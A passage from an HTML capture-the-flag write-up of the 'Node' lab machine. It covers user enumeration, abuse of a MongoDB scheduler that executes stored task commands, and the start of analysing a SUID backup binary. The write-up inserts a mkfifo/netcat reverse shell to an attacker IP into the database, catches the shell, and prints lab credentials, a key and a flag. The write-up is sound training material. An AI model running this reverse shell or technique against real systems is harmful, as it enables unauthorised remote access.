+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Aug&nbsp;30&nbsp;&nbsp;2017&nbsp;.config<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>-----&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Sep&nbsp;&nbsp;3&nbsp;&nbsp;2017&nbsp;.dbshell<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Aug&nbsp;30&nbsp;&nbsp;2017&nbsp;.mongorc.js<br>
+                drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;2&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Aug&nbsp;29&nbsp;&nbsp;2017&nbsp;.nano<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;5&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Aug&nbsp;31&nbsp;&nbsp;2017&nbsp;.npm<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;655&nbsp;Aug&nbsp;29&nbsp;&nbsp;2017&nbsp;.profile<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>-----&nbsp;1&nbsp;root&nbsp;tom&nbsp;&nbsp;&nbsp;&nbsp;33&nbsp;Sep&nbsp;&nbsp;3&nbsp;&nbsp;2017&nbsp;user.txt
+            </div>
+        </div><br>
+        <br>
+        Check for running processes not running as root.<br>
+            <div class="codebox">
+                mark@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ps</span>&nbsp;aux&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;-v&nbsp;root<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PID&nbsp;%CPU&nbsp;%MEM&nbsp;&nbsp;&nbsp;&nbsp;VSZ&nbsp;&nbsp;&nbsp;RSS&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STAT&nbsp;START&nbsp;&nbsp;&nbsp;TIME&nbsp;COMMAND<br>
+                [...]<br>
+                mongodb&nbsp;&nbsp;&nbsp;1228&nbsp;&nbsp;0.4&nbsp;12.0&nbsp;284288&nbsp;91232&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ssl&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>25&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>mongod&nbsp;--auth&nbsp;--quiet&nbsp;--config&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>mongod.conf<br>
+                tom&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1230&nbsp;&nbsp;0.0&nbsp;&nbsp;5.7&nbsp;1009080&nbsp;43536&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ssl&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>node&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>scheduler<span style="color:#ff9d00;font-weight:700">/</span>app.js<br>
+                tom&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1241&nbsp;&nbsp;0.0&nbsp;&nbsp;6.5&nbsp;1022056&nbsp;49392&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ssl&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>node&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>app.js<br>
+                mark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1482&nbsp;&nbsp;0.0&nbsp;&nbsp;0.5&nbsp;&nbsp;45248&nbsp;&nbsp;4428&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ss&nbsp;&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>systemd<span style="color:#ff9d00;font-weight:700">/</span>systemd&nbsp;--user<br>
+                mark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1484&nbsp;&nbsp;0.0&nbsp;&nbsp;0.2&nbsp;&nbsp;61328&nbsp;&nbsp;2056&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>sd-pam<span style="color:#ff9d00;font-weight:700">)</span><br>
+                mark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1492&nbsp;&nbsp;0.0&nbsp;&nbsp;0.4&nbsp;&nbsp;95404&nbsp;&nbsp;3264&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;sshd<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;mark@pts<span style="color:#ff9d00;font-weight:700">/</span>0<br>
+                mark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1493&nbsp;&nbsp;0.0&nbsp;&nbsp;0.6&nbsp;&nbsp;22584&nbsp;&nbsp;4672&nbsp;pts<span style="color:#ff9d00;font-weight:700">/</span>0&nbsp;&nbsp;&nbsp;&nbsp;Ss&nbsp;&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;-bash<br>
+                mark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3199&nbsp;&nbsp;0.0&nbsp;&nbsp;0.4&nbsp;&nbsp;37372&nbsp;&nbsp;3324&nbsp;pts<span style="color:#ff9d00;font-weight:700">/</span>0&nbsp;&nbsp;&nbsp;&nbsp;R+&nbsp;&nbsp;&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>12&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;<span style="color:#ff9d00;font-weight:700">ps</span>&nbsp;aux
+            </div>
+        </div><br>
+        <br>
+        You'll see that <code>tom</code> is running 2 MongoDB databases - <code>/var/scheduler/app.js</code> and <code>/var/www/myplace/app.js</code>.<br>
+        <br>
+        Check <code>/var/scheduler/app.js</code> to see the scheduler database config.<br>
+        <br>
+        We can connect with mark's credentials - <code>mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler</code><br>
+        And we can execute commands.<br>
+            <div class="codebox">
+                &nbsp;&nbsp;setInterval(<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;()&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;db.collection(<span style="color:#3ad900;font-weight:400">'tasks'</span>).find().toArray(<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;(error,&nbsp;docs)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(!error&nbsp;&amp;&amp;&nbsp;docs)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;docs.forEach(<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;(doc)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(doc)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.<span style="color:#333333;font-weight:400">log</span>(<span style="color:#3ad900;font-weight:400">'Executing&nbsp;task&nbsp;'</span>&nbsp;+&nbsp;doc._id&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'...'</span>);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">exec</span>(doc.cmd);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db.collection(<span style="color:#3ad900;font-weight:400">'tasks'</span>).deleteOne({&nbsp;_id:&nbsp;<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;ObjectID(doc._id)&nbsp;});<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});
+            </div>
+        </div><br>
+        <br>
+        In the 'tasks' collection (table) - <code>db.collection('tasks').find()</code><br>
+        If there's a no errors and docs - <code>if (!error &amp;&amp; docs) {</code><br>
+        For each document - <code>docs.forEach(function (doc) {</code><br>
+        Execute all docs with an ID of cmd - <code>exec(doc.cmd);</code><br>
+        And then delete it - <code>db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });</code><br>
+        (the explanation above could be totally wrong, that's just how I understood it.)<br>
+        <br>
+        If we insert an entry of cmd : command in scheduler's tasks collection, the MongoDB database will execute it.<br>
+        Because the database is running as tom, the command will be executed as tom.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>5a) MongoDB scheduler - Code Execution</strong></h3><br>
+        Insert a reverse shell into the database to escalate to Tom.<br>
+        <br>
+        Start a listener on your attacking machine to receive the shell.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:/</span>tmp#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Login as mark to the scheduler database.<br>
+            <div class="codebox">
+                mark@node<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;mongo&nbsp;-u&nbsp;<span style="color:#3ad900;font-weight:400">"mark"</span>&nbsp;-p&nbsp;<span style="color:#3ad900;font-weight:400">"5AYRft73VtFpc84k"</span>&nbsp;localhost<span style="color:#ff9d00;font-weight:700">:</span>27017<span style="color:#ff9d00;font-weight:700">/</span>scheduler<br>
+                MongoDB&nbsp;shell&nbsp;version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;3.2.16<br>
+                connecting&nbsp;to<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;localhost<span style="color:#ff9d00;font-weight:700">:</span>27017<span style="color:#ff9d00;font-weight:700">/</span>scheduler<br>
+                &gt;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Collections are like tables in other databases.<br>
+        <code>show collections</code> shows the <code>tasks</code> table which we'll be inserting into.<br>
+            <div class="codebox">
+                &gt;&nbsp;show&nbsp;collections<br>
+                tasks
+            </div>
+        </div><br>
+        <br>
+        Insert your command with <code>db.collection.insert()</code>.<br>
+        Netcat's -e, to execute /bin/bash, is disabled on this system, so I used a pipe reverse shell.<br>
+            <div class="codebox">
+                &gt;&nbsp;db.tasks.insert<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>&nbsp;<span style="color:#3ad900;font-weight:400">"cmd"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#3ad900;font-weight:400">"mkfifo&nbsp;/tmp/f&nbsp;;&nbsp;nc&nbsp;10.10.14.18&nbsp;9001&nbsp;&lt;&nbsp;/tmp/f&nbsp;|&nbsp;/bin/sh&nbsp;&gt;&nbsp;/tmp/f&nbsp;2&gt;&nbsp;/tmp/f&nbsp;;&nbsp;rm&nbsp;/tmp/f&nbsp;"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;<span style="color:#ff9d00;font-weight:700">)</span><br>
+                WriteResult<span style="color:#ff9d00;font-weight:700">({</span>&nbsp;<span style="color:#3ad900;font-weight:400">"nInserted"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1&nbsp;<span style="color:#ff9d00;font-weight:700">})</span>
+            </div>
+        </div><br>
+        <br>
+        Run <code>db.tasks.find()</code> to check that your inserted entry is there, and wait...<br>
+            <div class="codebox">
+                &gt;&nbsp;db.tasks.<span style="color:#ffdd00;font-weight:400">find()</span><br>
+                <span style="color:#ff9d00;font-weight:700">{</span>&nbsp;<span style="color:#3ad900;font-weight:400">"_id"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ObjectId<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"5da84d09b546f1a387c1faa9"</span><span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"cmd"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#3ad900;font-weight:400">"mkfifo&nbsp;/tmp/f&nbsp;;&nbsp;nc&nbsp;10.10.14.18&nbsp;9001&nbsp;&lt;&nbsp;/tmp/f&nbsp;|&nbsp;/bin/sh&nbsp;&gt;&nbsp;/tmp/f&nbsp;2&gt;&nbsp;/tmp/f&nbsp;;&nbsp;rm&nbsp;/tmp/f&nbsp;"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">}</span>
+            </div>
+        </div><br>
+        <br>
+        You shouldn't have to wait long.<br>
+        You'll see connection on your listener, and a reverse shell from tom!<br>
+        Spawn an interactive shell with <code>python -c 'import pty; pty.spawn("/bin/bash")'</code>, and grab <code>user.txt</code>!<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.18]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.58]&nbsp;44858<br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=1000<span style="color:#ff9d00;font-weight:700">(</span>tom<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1000<span style="color:#ff9d00;font-weight:700">(</span>tom<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=1000<span style="color:#ff9d00;font-weight:700">(</span>tom<span style="color:#ff9d00;font-weight:700">)</span>,4<span style="color:#ff9d00;font-weight:700">(</span>adm<span style="color:#ff9d00;font-weight:700">)</span>,24<span style="color:#ff9d00;font-weight:700">(</span>cdrom<span style="color:#ff9d00;font-weight:700">)</span>,27<span style="color:#ff9d00;font-weight:700">(sudo)</span>,30<span style="color:#ff9d00;font-weight:700">(</span>dip<span style="color:#ff9d00;font-weight:700">)</span>,46<span style="color:#ff9d00;font-weight:700">(</span>plugdev<span style="color:#ff9d00;font-weight:700">)</span>,115<span style="color:#ff9d00;font-weight:700">(</span>lpadmin<span style="color:#ff9d00;font-weight:700">)</span>,116<span style="color:#ff9d00;font-weight:700">(</span>sambashare<span style="color:#ff9d00;font-weight:700">)</span>,1002<span style="color:#ff9d00;font-weight:700">(</span>admin<span style="color:#ff9d00;font-weight:700">)</span><br>
+                python&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'</span><br>
+                To&nbsp;run&nbsp;a&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;as&nbsp;administrator&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>user&nbsp;<span style="color:#3ad900;font-weight:400">'root'</span><span style="color:#ff9d00;font-weight:700">;)</span>,&nbsp;use&nbsp;<span style="color:#3ad900;font-weight:400">'sudo&nbsp;&lt;command&gt;'</span>.<br>
+                See&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>quot<span style="color:#ff9d00;font-weight:700">;man</span>&nbsp;sudo_root<span style="color:#ff9d00;font-weight:700">&amp;</span>quot<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">details</span>.<br>
+                <br>
+                tom@node:/$&nbsp;cd&nbsp;~<br>
+                tom@node:~$&nbsp;cat&nbsp;user.txt<br>
+                e1156acc3574e04b06908ecf76be91b1
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-4" name="h1-4"></a><strong></strong>
+        <h1><strong>Priv-Esc to root</strong></h1>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) SUID binaries</strong></h2><br>
+        Check for SUID binaries on the system with <code>find / -perm -u=s 2&gt;/dev/null</code>.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-perm&nbsp;-u=s&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                [...]<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>chfn<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>at<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>gpasswd<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>newgidmap<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>chsh<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sudo</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>pkexec<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>newgrp<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/passwd</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>newuidmap<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/ping</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/umount</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>fusermount<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>ping6<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>ntfs-3g<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/su</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/mount</span>
+            </div>
+        </div><br>
+        <br>
+        All of those are normal, apart from 1 - <code>/usr/local/bin/backup</code>.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) /usr/local/bin/backup Reconaissance</strong></h2><br>
+        Check the permissions of <code>backup</code>.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup<br>
+                <span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup<br>
+                -rwsr-xr--&nbsp;1&nbsp;root&nbsp;admin&nbsp;16484&nbsp;Sep&nbsp;&nbsp;3&nbsp;&nbsp;2017&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup
+            </div>
+        </div><br>
+        The binary runs as root.<br>
+        <br>
+        Users who are part of the <code>admin</code> group can run it.<br>
+        Fortunately, Tom is part of the <code>admin</code> group.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span><br>
+                tom&nbsp;adm&nbsp;cdrom&nbsp;<span style="color:#ff9d00;font-weight:700">sudo</span>&nbsp;dip&nbsp;plugdev&nbsp;lpadmin&nbsp;sambashare&nbsp;admin
+            </div>
+        </div><br>
+        <br>
+        Running the binary doesn't appear to do anything.<br>
+        <code>ltrace</code> shows that the binary is running the <code>geteuid()</code> and <code>setuid()</code> functions, and then exiting.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup<br>
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;ltrace&nbsp;backup<br>
+                ltrace&nbsp;backup<br>
+                __libc_start_main<span style="color:#ff9d00;font-weight:700">(</span>0x80489fd,&nbsp;1,&nbsp;0xfff232c4,&nbsp;0x80492c0&nbsp;&lt;unfinished&nbsp;...&gt;<br>
+                <span style="color:#ffdd00;font-weight:400">geteuid()</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;1000<br>
+                setuid<span style="color:#ff9d00;font-weight:700">(</span>1000<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0<br>
+                <span style="color:#ff9d00;font-weight:700">exit(</span>1&nbsp;&lt;no&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;...&gt;<br>
+                +++&nbsp;exited&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>status&nbsp;1<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;+++
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>7a) Running /usr/local/bin/backup</strong></h3><br>
+        We downloaded the backup file that this binary is presumably creating from the MyPlace website, so check <code>/var/www/myplace/app.js</code> (this step stumped me for a while).<br>
+        <br>
+        Towards the bottom of the file, you'll see the command that MyPlace is running to create the backup - <code>/usr/local/bin/backup -q backup_key __dirname</code><br>
+        <br>
+            <div class="codebox">
+                app.get(<span style="color:#3ad900;font-weight:400">'/api/admin/backup'</span>,&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;(req,&nbsp;res)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(req.session.user&nbsp;&amp;&amp;&nbsp;req.session.user.is_admin)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">var</span>&nbsp;proc&nbsp;=&nbsp;spawn(<span style="color:#3ad900;font-weight:400">'/usr/local/bin/backup'</span>,&nbsp;[<span style="color:#3ad900;font-weight:400">'-q'</span>,&nbsp;backup_key,&nbsp;__dirname&nbsp;]);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">var</span>&nbsp;backup&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">''</span>;
+            </div>
+        </div><br>
+        <br>
+        The <code>backup_key</code> variable is available in app.js, at the top.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">const</span>&nbsp;backup_key&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474'</span>;
+            </div>
+        </div><br>
+        <br>
+        If you try to backup a ‘test’ file using the command syntax found in <code>app.js</code>, the binary doesn't appear to do anything.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup&nbsp;-q&nbsp;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&nbsp;<span style="color:#ff9d00;font-weight:700">test</span>
+            </div>
+        </div><br>
+        <br>
+        However, if you run the above command with <code>ltrace</code>, you'll see that it runs and exits successfully.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;ltrace&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup&nbsp;-q&nbsp;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&nbsp;<span style="color:#ff9d00;font-weight:700">test</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                [...]<br>
